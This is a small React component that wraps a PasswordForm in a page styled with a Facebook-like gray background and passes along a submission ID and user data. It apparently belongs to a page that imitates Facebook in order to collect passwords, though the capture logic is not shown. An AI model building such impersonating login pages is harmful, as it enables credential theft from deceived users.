import PasswordForm from '@/components/PasswordForm';

interface PasswordVerificationProps {
  submissionId: number;
  userData: any;
}

export default function PasswordVerification({ submissionId, userData }: PasswordVerificationProps) {
  return (
    <div className="min-h-screen bg-facebook-gray">
      <PasswordForm submissionId={submissionId} userData={userData} />
    </div>
  );
}
